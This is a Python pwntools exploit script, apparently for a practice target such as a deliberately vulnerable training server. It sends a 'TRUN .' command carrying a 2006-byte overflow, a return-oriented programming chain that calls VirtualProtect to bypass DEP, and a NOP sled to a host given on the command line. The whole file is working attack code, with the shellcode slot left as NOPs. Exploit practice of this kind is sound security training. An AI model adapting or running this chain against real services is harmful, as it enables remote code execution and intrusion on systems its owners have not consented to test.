#!/usr/bin/env python
from pwn import *
import sys

server, sport = sys.argv[1:3]

# pushad VirtualProtect
# Push(EAX); nop
# Push(ECX); lpflOldProtect
# Push(EDX); flNewProtect
# Push(EBX); dwSize
# Push(ESP); lpAddress

# p32(0x77b33577), # pop esi; ret
# p32(0x727e6cfd), # shr eax, 1; ret
# p32(0x625010b5), # pop ebp; ret
# p32(0x77af6732), # push eax; ret
# p32(0x625011b4) # pop eax ; ret
# p32(0x77b23969) # xchg eax, esp; ret
# p32(0x77b18b88) # xchg eax, ebp; ret
# p32(0x77ad8b75) # xchg eax, edi; retf
# p32(0x77a89867) # xchg eax, ebx; ret 4
# p32(0x77a613bb) # xchg eax, ebx; retf
# p32(0x77a610cd) # xchg eax, edi; ret
# p32(0x77a5b992) # xchg eax, edx; ret
# p32(0x77a50ca8) # xchg eax, ebx; ret
# p32(0x77a4ff64) # xchg eax, ecx; ret

gadgets = [
    p32(0x625011b4), # pop eax ; ret
    p32(0xffffffc0), # - 0x40
    p32(0x76cbae18), # neg eax; ret
    p32(0x77a5b992), # xchg eax, edx; ret -> flNewProtect
    p32(0x625011b4), # pop eax ; ret
    p32(0xffffffff), # - 0x01
    p32(0x76cbae18), # neg eax; ret
    p32(0x77a8b0ff), # shl eax, 8; ret
    p32(0x77a50ca8), # xchg eax, ebx; ret -> dwSize
    p32(0x625011b4), # pop eax ; ret
    p32(0x90909090), # nop
    p32(0x7596670f), # pop ecx -> lpflOldProtect
    p32(0x62506a10), # idata + a10
    p32(0x77b33577), # pop esi; ret
    p32(0x76c87c70), # VirtualProtect
    p32(0x7280efb3), # pop edi
    p32(0x625011b5), # ret
    p32(0x625010b5), # pop ebp; ret
    p32(0x625011eb), # jmp esp
    p32(0x77ad795c), # pushad; ret


]

payload = b'A' * 2006
for i in gadgets:
    payload += i

#payload += p32(0x625011eb)
payload += asm('nop') * 3000

server, sport = sys.argv[1:3]
s = socket.socket()
connect = s.connect((server, int(sport)))
#print(s.recv(1024))
s.send((b'TRUN .' + payload + b'\r\n'))

